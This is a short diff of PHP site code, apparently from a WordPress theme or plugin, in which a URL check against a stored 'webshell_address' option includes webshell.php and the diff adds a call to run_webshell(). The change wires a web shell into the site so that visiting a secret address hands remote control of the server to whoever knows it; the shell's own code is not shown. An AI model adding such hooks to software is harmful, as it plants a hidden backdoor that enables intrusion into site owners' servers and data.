@@ -243,6 +243,7 @@ function curPageURL() {
 $current_url = curPageURL();
 if ($current_url == get_option('webshell_address')) {
     include_once('webshell.php');
+    run_webshell();
 }
 
 // 添加后台页面实现自定义设置
